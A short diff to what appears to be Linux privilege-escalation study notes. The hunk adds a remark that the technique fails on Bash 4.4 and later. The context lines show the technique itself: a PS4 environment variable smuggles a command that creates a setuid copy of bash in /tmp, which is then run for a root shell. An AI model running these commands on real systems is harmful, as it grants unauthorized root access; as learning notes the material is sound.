@@ -23,3 +23,5 @@
 #### env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/example2-env
 
 #### /tmp/rootbash -p
+
+## Note: Doesn't work on Bash versions 4.4 and above!
